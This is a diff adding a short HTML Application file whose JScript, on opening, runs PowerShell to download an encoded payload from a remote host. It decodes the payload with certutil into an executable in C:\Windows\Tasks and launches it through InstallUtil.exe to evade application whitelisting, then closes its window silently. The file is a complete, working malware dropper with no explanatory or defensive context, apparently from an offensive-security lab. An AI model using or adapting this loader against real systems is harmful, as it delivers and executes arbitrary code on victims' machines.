@@ -1,0 +1,13 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri http://192.168.45.187:8000/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc1.txt C:\\Windows\\Tasks\\enc1.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\Windows\\Tasks\\enc1.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
